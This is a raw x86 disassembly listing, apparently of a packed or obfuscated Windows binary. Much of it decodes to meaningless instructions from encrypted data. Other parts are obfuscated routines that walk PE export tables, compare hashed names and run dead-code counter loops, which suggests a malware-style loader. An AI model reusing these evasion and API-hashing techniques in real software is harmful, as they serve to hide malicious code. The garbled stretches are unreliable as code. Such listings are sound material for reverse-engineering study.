  40e580:	addr16 mov ds:0xfb52,eax
  40e584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e585:	cmp    ebx,DWORD PTR [ebp+0x55f6281b]
  40e58b:	addr16 leave 
  40e58d:	fidiv  WORD PTR ds:0xe0f3c54
  40e593:	sbb    al,0xd6
  40e595:	mov    eax,ds:0x51131235
  40e59a:	push   edi
  40e59b:	out    dx,eax
  40e59c:	jns    0x40e60a
  40e59e:	mov    edi,0xb556f136
  40e5a3:	jbe    0x40e5fa
  40e5a5:	cmc    
  40e5a6:	cli    
  40e5a7:	jecxz  0x40e5f8
  40e5a9:	or     BYTE PTR [esi+0x2418f27],0x73
  40e5b0:	push   ss
  40e5b1:	std    
  40e5b2:	sbb    DWORD PTR [ecx+0x5058457],ecx
  40e5b8:	mov    DWORD PTR [ecx+0x1ad6df15],ecx
  40e5be:	mov    bl,0xb5
  40e5c0:	sub    DWORD PTR [edx+0xb10a7e3],ebx
  40e5c6:	dec    edi
  40e5c7:	inc    esp
  40e5c8:	in     al,dx
  40e5c9:	movzx  esi,WORD PTR [ecx+0x68]
  40e5cd:	loop   0x40e559
  40e5cf:	and    ch,BYTE PTR [edx]
  40e5d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5d2:	jl     0x40e58a
  40e5d4:	in     eax,dx
  40e5d5:	jle    0x40e5e1
  40e5d7:	adc    BYTE PTR [ecx],dh
  40e5d9:	or     al,ah
  40e5db:	mov    fs:0xa48b50f8,al
  40e5e1:	imul   edi,DWORD PTR [ebp-0x2f],0xffffffbd
  40e5e5:	push   ds
  40e5e6:	cli    
  40e5e7:	out    dx,al
  40e5e8:	(bad)  [edi-0x67]
  40e5eb:	add    bh,bl
  40e5ed:	mov    edi,0x6ac2ffa0
  40e5f2:	adc    DWORD PTR [edi-0x2d45a272],0x1e
  40e5f9:	adc    BYTE PTR [edi-0x16f07620],dh
  40e5ff:	jmp    0x95f2:0x4ec3c892
  40e606:	adc    eax,0x65461d52
  40e60b:	pop    edx
  40e60c:	mov    gs,eax
  40e60e:	xchg   esp,eax
  40e60f:	(bad)  
  40e611:	jne    0x40e5dd
  40e613:	cmp    DWORD PTR [ebx],esi
  40e615:	jno    0x40e67a
  40e617:	das    
  40e618:	out    0xe1,eax
  40e61a:	loop   0x40e5e2
  40e61c:	call   0xe2ba:0xd59a6e67
  40e623:	std    
  40e624:	jmp    0xeb28:0x267ad0b2
  40e62b:	xchg   edx,eax
  40e62c:	test   al,0x9d
  40e62e:	push   0x8
  40e630:	call   0xdaf97f82
  40e635:	xor    al,0x4c
  40e637:	and    eax,0x9255ef51
  40e63c:	sbb    dh,BYTE PTR [eax-0x191e783f]
  40e642:	jo     0x40e68a
  40e644:	xor    eax,0xd3b25efa
  40e649:	mov    ch,0x19
  40e64b:	loopne 0x40e62f
  40e64d:	hlt    
  40e64e:	call   0x4daf6e53
  40e653:	shr    BYTE PTR [ecx+0x2bb0902d],1
  40e659:	sub    cl,BYTE PTR [edi+0x28]
  40e65c:	adc    edi,DWORD PTR [eax-0x77]
  40e65f:	xchg   ebx,eax
  40e660:	in     al,dx
  40e661:	pcmpeqb mm0,QWORD PTR [eax+ebp*4+0x3a]
  40e666:	in     al,dx
  40e667:	or     bh,cl
  40e669:	push   eax
  40e66a:	push   cs
  40e66b:	in     al,dx
  40e66c:	leave  
  40e66d:	mov    ds:0x8aa99ff7,al
  40e672:	ss pop ecx
  40e674:	ss dec esi
  40e676:	mov    ch,0xa1
  40e678:	dec    BYTE PTR [eax-0x3d699134]
  40e67e:	and    BYTE PTR [ecx-0x693422ce],dl
  40e684:	dec    ecx
  40e685:	(bad)  
  40e686:	shl    DWORD PTR [ebx],1
  40e688:	jmp    0xc7e2:0x8fcea6d4
  40e68f:	ja     0x40e6e5
  40e691:	out    dx,eax
  40e692:	into   
  40e693:	popa   
  40e694:	xlat   BYTE PTR ds:[ebx]
  40e695:	loope  0x40e689
  40e697:	inc    ecx
  40e698:	xchg   esi,eax
  40e699:	sar    ecx,1
  40e69b:	push   edx
  40e69c:	mov    eax,ds:0x67039771
  40e6a1:	xchg   DWORD PTR [ebp-0x6e],ecx
  40e6a4:	in     al,0x8a
  40e6a6:	cmp    al,0xb
  40e6a8:	jge    0x40e6b8
  40e6aa:	jns    0x40e70a
  40e6ac:	sub    ecx,DWORD PTR [ebx+0x7cd58225]
  40e6b2:	fwait
  40e6b3:	sub    BYTE PTR [ebx],dh
  40e6b5:	(bad)  
  40e6b6:	lahf   
  40e6b7:	aaa    
  40e6b8:	retf   
  40e6b9:	icebp  
  40e6ba:	xchg   edi,eax
  40e6bb:	inc    edi
  40e6bc:	popa   
  40e6bd:	adc    DWORD PTR [edx-0x3e],0x281689da
  40e6c4:	pop    ebx
  40e6c5:	int    0x5d
  40e6c7:	dec    ebp
  40e6c8:	test   ecx,esp
  40e6ca:	xor    ebp,DWORD PTR [ecx]
  40e6cc:	aam    0x9e
  40e6ce:	mov    ebx,0x138dbc15
  40e6d3:	mov    cl,0xd2
  40e6d5:	mov    eax,0x46f2962a
  40e6da:	test   al,0xc6
  40e6dc:	add    al,BYTE PTR [eax-0x78822279]
  40e6e2:	cs stos BYTE PTR es:[edi],al
  40e6e4:	cld    
  40e6e5:	bound  edi,QWORD PTR [esi+ecx*2-0x23588d12]
  40e6ec:	adc    ebp,DWORD PTR [ebp-0x4c01aa41]
  40e6f2:	outs   dx,DWORD PTR ds:[esi]
  40e6f3:	and    dl,BYTE PTR [ebp-0x43]
  40e6f6:	test   BYTE PTR [edx],cl
  40e6f8:	mov    WORD PTR [esi+0x6693f736],?
  40e6fe:	or     eax,0xba35db17
  40e703:	xor    ebp,DWORD PTR [ecx-0x20]
  40e706:	rcl    BYTE PTR [edx+0x54],1
  40e709:	or     BYTE PTR ds:0xc8c2ff4a,bl
  40e70f:	ret    
  40e710:	xchg   ch,al
  40e712:	imul   esp,DWORD PTR [edx-0x68e911ad],0xffffffa7
  40e719:	jmp    0x609c:0x5a10da44
  40e720:	inc    ebx
  40e721:	mov    eax,ds:0x6a843d4d
  40e726:	fist   DWORD PTR [ecx-0x2fd9d04f]
  40e72c:	xchg   ebx,eax
  40e72d:	push   eax
  40e72e:	mov    al,0xc3
  40e730:	rcr    BYTE PTR [ecx],cl
  40e732:	inc    ecx
  40e733:	dec    ebx
  40e734:	inc    ecx
  40e735:	xor    al,0xc7
  40e737:	mov    ebx,0x39a6efad
  40e73c:	cmp    ah,cl
  40e73e:	out    0x12,al
  40e740:	(bad)  [ebx+ecx*4+0x3a5f23a5]
  40e747:	je     0x40e717
  40e749:	dec    edi
  40e74a:	add    bh,al
  40e74c:	ins    DWORD PTR es:[edi],dx
  40e74d:	mov    DWORD PTR [ecx+0x1e],ebx
  40e750:	lds    ecx,FWORD PTR [ebp+0xbe77037]
  40e756:	jmp    0xc12ebd00
  40e75b:	fs stc 
  40e75d:	out    dx,al
  40e75e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e75f:	xchg   ebp,eax
  40e760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e761:	push   ebx
  40e762:	lods   eax,DWORD PTR ds:[esi]
  40e763:	pop    edx
  40e764:	loop   0x40e762
  40e766:	mov    gs,esp
  40e768:	push   ss
  40e769:	mov    edx,0xbf951e0
  40e76e:	cli    
  40e76f:	sub    eax,0xd13c0efc
  40e774:	inc    eax
  40e775:	bound  eax,QWORD PTR [edi+ebp*1]
  40e778:	sbb    eax,0x76e039d8
  40e77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e77e:	(bad)  
  40e77f:	enter  0x4465,0xf8
  40e783:	arpl   WORD PTR [esi],cx
  40e785:	das    
  40e786:	mov    al,ds:0x4dcaf2b
  40e78b:	scas   al,BYTE PTR es:[edi]
  40e78c:	cmp    al,BYTE PTR [ecx]
  40e78e:	es pusha 
  40e790:	mov    BYTE PTR [esi+0x53c07b6b],al
  40e796:	push   0x17
  40e798:	pop    eax
  40e799:	push   0xffffffa2
  40e79b:	loop   0x40e80a
  40e79d:	cmp    al,0xf7
  40e79f:	scas   eax,DWORD PTR es:[edi]
  40e7a0:	add    esi,edx
  40e7a2:	push   ebx
  40e7a3:	retf   0xe4a8
  40e7a6:	inc    esi
  40e7a7:	rcl    esp,cl
  40e7a9:	jo     0x40e7f3
  40e7ab:	aaa    
  40e7ac:	sub    eax,eax
  40e7ae:	in     eax,0x9c
  40e7b0:	js     0xf3b864d
  40e7b6:	shl    ch,0x7e
  40e7b9:	js     0x40e81e
  40e7bb:	scas   al,BYTE PTR es:[edi]
  40e7bc:	push   ss
  40e7bd:	scas   al,BYTE PTR es:[edi]
  40e7be:	cmp    eax,0x669dd15f
  40e7c3:	hlt    
  40e7c4:	sub    al,0x4c
  40e7c6:	adc    eax,0xf0ede672
  40e7cb:	dec    ecx
  40e7cc:	dec    esi
  40e7cd:	popa   
  40e7ce:	pop    edi
  40e7cf:	mov    edx,0x9ea1e28d
  40e7d4:	icebp  
  40e7d5:	add    cl,BYTE PTR [eax]
  40e7d7:	mov    DWORD PTR [eax-0x51929809],esp
  40e7dd:	cwde   
  40e7de:	or     esi,DWORD PTR [edx+ecx*2-0x61]
  40e7e2:	pop    ebp
  40e7e3:	or     DWORD PTR [esi-0x59c9c180],esp
  40e7e9:	push   edx
  40e7ea:	add    al,BYTE PTR [bp+si+0x58]
  40e7ee:	push   ebx
  40e7ef:	cwde   
  40e7f0:	adc    BYTE PTR [ebx],dh
  40e7f2:	mov    ecx,0x7705e453
  40e7f7:	scas   eax,DWORD PTR es:[edi]
  40e7f8:	cmp    dh,al
  40e7fa:	mov    dh,0xa7
  40e7fc:	and    eax,0x79787a7c
  40e801:	xacquire xchg DWORD PTR [esi-0x208dd097],ecx
  40e808:	cmc    
  40e809:	sub    eax,0x3db84dc0
  40e80e:	adc    al,0xef
  40e810:	cmp    BYTE PTR [edx],bl
  40e812:	dec    esi
  40e813:	dec    ebx
  40e814:	or     ebp,DWORD PTR [edi+esi*2]
  40e817:	lods   al,BYTE PTR ds:[esi]
  40e818:	(bad)  [ebx-0x46]
  40e81b:	out    dx,eax
  40e81c:	xchg   BYTE PTR ds:0x30e917e2,bl
  40e822:	cmp    eax,0xcb3ab2e
  40e827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e828:	test   eax,0xc4505db4
  40e82d:	dec    edx
  40e82e:	out    0x89,eax
  40e830:	sti    
  40e831:	dec    esi
  40e832:	aam    0x18
  40e834:	test   BYTE PTR [edx+0x6a],0xab
  40e838:	std    
  40e839:	push   cs
  40e83a:	(bad)  
  40e83c:	sar    esi,1
  40e83e:	shl    DWORD PTR [ecx],1
  40e840:	fsub   DWORD PTR [ebx+0x50d296f6]
  40e846:	fsub   QWORD PTR [eax]
  40e848:	int3   
  40e849:	add    dh,cl
  40e84b:	mov    ?,WORD PTR [eax+0x295043a7]
  40e851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e852:	sub    eax,0xf4148573
  40e857:	and    ch,BYTE PTR [esi-0x666cf40a]
  40e85d:	outs   dx,DWORD PTR ds:[esi]
  40e85e:	add    DWORD PTR [esi+0x691dae68],esp
  40e864:	hlt    
  40e865:	pop    esi
  40e866:	into   
  40e867:	push   ecx
  40e868:	mov    eax,0x683b1572
  40e86d:	adc    DWORD PTR [ecx+0x532a02c],esi
  40e873:	jbe    0x40e838
  40e875:	data16 daa 
  40e877:	das    
  40e878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e879:	shr    ebx,cl
  40e87b:	fstp   TBYTE PTR [ecx+0x75]
  40e87e:	mov    esi,0xb58db814
  40e883:	jb     0x40e858
  40e885:	mov    dl,BYTE PTR [ebp-0x67b7f55f]
  40e88b:	cli    
  40e88c:	mov    ecx,0x51815aee
  40e891:	mov    al,0xf1
  40e893:	jg     0x40e8ea
  40e895:	adc    eax,0xbf51a2ac
  40e89a:	jg     0x40e8c8
  40e89c:	inc    ebx
  40e89d:	cmc    
  40e89e:	repnz hlt 
  40e8a0:	add    esp,DWORD PTR [edi-0x2]
  40e8a3:	jo     0x40e8fe
  40e8a5:	sbb    dl,0x13
  40e8a8:	popf   
  40e8a9:	in     eax,0xd8
  40e8ab:	mov    esp,0xcc11a004
  40e8b0:	mov    bl,0x1
  40e8b2:	xor    BYTE PTR [eax-0x77],ch
  40e8b5:	adc    ebx,ecx
  40e8b7:	xchg   edx,eax
  40e8b8:	mov    ebp,0x66a7620a
  40e8bd:	iret   
  40e8be:	data16 lods al,BYTE PTR ds:[esi]
  40e8c0:	(bad)  
  40e8c1:	inc    ebp
  40e8c2:	in     eax,0x42
  40e8c4:	sbb    al,0x83
  40e8c6:	rcr    DWORD PTR [edi+0x2a484c13],1
  40e8cc:	scas   eax,DWORD PTR es:[edi]
  40e8cd:	hlt    
  40e8ce:	loope  0x40e8c5
  40e8d0:	push   esi
  40e8d1:	cmp    ebp,DWORD PTR gs:[edi+0x21]
  40e8d5:	add    al,0xca
  40e8d7:	repnz mov ch,0x4c
  40e8da:	in     al,0x6e
  40e8dc:	sbb    DWORD PTR [ecx],esp
  40e8de:	mov    DWORD PTR [edi-0x9abefa3],esp
  40e8e4:	fldl2t 
  40e8e6:	mov    ds:0xaa96680d,eax
  40e8eb:	inc    esp
  40e8ec:	jmp    0x672e482a
  40e8f1:	mov    eax,0xa819d2d3
  40e8f6:	jnp    0x40e969
  40e8f8:	pop    edi
  40e8f9:	mov    BYTE PTR [ebx+0x1f],0x4
  40e8fd:	pop    ebx
  40e8fe:	ret    
  40e8ff:	add    dh,BYTE PTR [ebx]
  40e901:	imul   edi,edx,0x8e76fb82
  40e907:	fxam   
  40e909:	out    dx,eax
  40e90a:	push   edi
  40e90b:	mov    ds:0x3f3b215c,al
  40e910:	aaa    
  40e911:	shl    DWORD PTR [ebx+esi*4],cl
  40e914:	in     al,0x47
  40e916:	xchg   ebp,ecx
  40e918:	adc    eax,0xd95b01c
  40e91d:	xor    DWORD PTR [ebx-0x702aa7fa],ebx
  40e923:	xor    DWORD PTR [edi-0x1b5b7db5],edi
  40e929:	cmp    BYTE PTR [esi+eiz*8-0x20d389b5],al
  40e930:	or     ch,0xec
  40e933:	jg     0x40e95b
  40e935:	js     0x40e94d
  40e937:	mov    ds:0xedc5d907,eax
  40e93c:	mov    WORD PTR [edx+0x6],cs
  40e93f:	dec    ebx
  40e940:	inc    eax
  40e941:	(bad)  [esi]
  40e943:	daa    
  40e944:	inc    ebp
  40e945:	and    ch,BYTE PTR [eax-0x565d7fad]
  40e94b:	ret    0xb4c1
  40e94e:	add    BYTE PTR [ebp+0x217167f8],0x2
  40e955:	(bad)  
  40e956:	es jns 0x40e94d
  40e959:	sub    eax,0xdbae4069
  40e95e:	mov    cl,0x89
  40e960:	pusha  
  40e961:	jae    0x40e981
  40e963:	jl     0x40e925
  40e965:	jecxz  0x40e9dd
  40e967:	push   edi
  40e968:	(bad)  
  40e969:	pop    edi
  40e96a:	cmp    esi,ebx
  40e96c:	ret    0x78e8
  40e96f:	inc    esp
  40e970:	mov    al,ds:0xc2f430dd
  40e975:	rol    cl,cl
  40e977:	pop    edi
  40e978:	aad    0xab
  40e97a:	cld    
  40e97b:	pop    ss
  40e97c:	mov    ch,0x61
  40e97e:	sbb    eax,0xc13e5209
  40e983:	mov    DWORD PTR [edi-0x5fd77f0f],edx
  40e989:	sti    
  40e98a:	(bad)  
  40e98c:	scas   eax,DWORD PTR es:[edi]
  40e98d:	adc    al,0xc5
  40e98f:	push   ds
  40e990:	mov    eax,ds:0x806ec08f
  40e995:	sbb    eax,DWORD PTR [edi+ebp*2]
  40e998:	mov    edi,DWORD PTR [eax+0x3c]
  40e99b:	lea    esi,[edi+esi*8+0x78]
  40e99f:	mov    esi,DWORD PTR [esi+eax*1]
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	out    0x53,eax
  40ecee:	scas   eax,DWORD PTR es:[edi]
  40ecef:	jns    0x40ed6d
  40ecf1:	int3   
  40ecf2:	jl     0x40ed70
  40ecf4:	inc    eax
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	dec    edi
  40ecf9:	pop    eax
  40ecfa:	test   eax,0x76ca0b4a
  40ecff:	jae    0x40ecc0
  40ed01:	jecxz  0x40ecfb
  40ed03:	in     al,dx
  40ed04:	test   ch,al
  40ed06:	mov    ebp,0x3ee1c2fb
  40ed0b:	jne    0x40ecdc
  40ed0d:	jg     0x40ece7
  40ed0f:	mov    ?,WORD PTR [eax]
  40ed11:	mov    cs,WORD PTR [ebp-0x1]
  40ed14:	xlat   BYTE PTR ds:[ebx]
  40ed15:	jno    0x40ecd2
  40ed17:	mov    eax,ds:0xc8ddba46
  40ed1c:	push   esp
  40ed1d:	add    DWORD PTR [ecx],ebp
  40ed1f:	inc    ebp
  40ed20:	dec    esi
  40ed21:	in     al,dx
  40ed22:	lds    edx,FWORD PTR [esi-0x544a68fe]
  40ed28:	jo     0x40ecc5
  40ed2a:	adc    eax,0xa9ef993b
  40ed2f:	lds    ecx,FWORD PTR [edi+ecx*4]
  40ed32:	mov    edx,0x358f669f
  40ed37:	das    
  40ed38:	mov    ecx,DWORD PTR [ebp+0x19c3d504]
  40ed3e:	out    0xb2,al
  40ed40:	mov    bl,0x8f
  40ed42:	xchg   DWORD PTR [ebp-0x18],esp
  40ed45:	aaa    
  40ed46:	(bad)  
  40ed48:	inc    ebp
  40ed49:	loope  0x40eda4
  40ed4b:	scas   eax,DWORD PTR es:[edi]
  40ed4c:	mov    edx,0xcccaabab
  40ed51:	xor    ebp,DWORD PTR [edx-0x2d4acb7d]
  40ed57:	mov    ebp,0xbb01014a
  40ed5c:	ficom  DWORD PTR [esp+ebx*1]
  40ed5f:	and    BYTE PTR [ebx],ah
  40ed61:	sbb    DWORD PTR [edx+0x7cca89ea],ebp
  40ed67:	xchg   ebp,eax
  40ed68:	(bad)
  40ed6c:	(bad)  
  40ed6d:	pop    ecx
  40ed6e:	pop    ebx
  40ed6f:	outs   dx,BYTE PTR ds:[esi]
  40ed70:	js     0x40ed3c
  40ed72:	std    
  40ed73:	pushf  
  40ed74:	inc    ebp
  40ed75:	mov    ebx,ebp
  40ed77:	jmp    0xecb2:0x370d02cc
  40ed7e:	test   DWORD PTR [ebp-0x6a08de97],eax
  40ed84:	fidiv  WORD PTR [edx+0x3d]
  40ed87:	popf   
  40ed88:	xor    DWORD PTR [edi*4+0xea44224],eax
  40ed8f:	xor    al,0xe8
  40ed91:	shl    BYTE PTR [ebp-0x7ae38a40],1
  40ed97:	jle    0x40ee10
  40ed99:	int    0xf6
  40ed9b:	mov    esp,0x82ee22a5
  40eda0:	popf   
  40eda1:	(bad)  
  40eda2:	xchg   esp,eax
  40eda3:	jae    0x40ed33
  40eda5:	(bad)  
  40eda6:	sbb    edx,DWORD PTR [edx+eiz*8-0x209d9566]
  40edad:	pop    esp
  40edae:	ins    BYTE PTR es:[edi],dx
  40edaf:	adc    ebx,DWORD PTR [edi]
  40edb1:	cmp    cl,al
  40edb3:	dec    ebx
  40edb4:	jmp    0x42b7:0x7e490a04
  40edbb:	ret    0xe9a0
  40edbe:	dec    edi
  40edbf:	test   dh,ch
  40edc1:	adc    DWORD PTR [esi-0x11739229],ecx
  40edc7:	mov    esp,0xe8cfff0c
  40edcc:	sub    eax,DWORD PTR ds:0x364340a6
  40edd2:	jo     0x40ee39
  40edd4:	test   eax,0xe8273770
  40edd9:	int    0x12
  40eddb:	xchg   BYTE PTR [ebx-0x1dc7e9c],dh
  40ede1:	sub    al,0x96
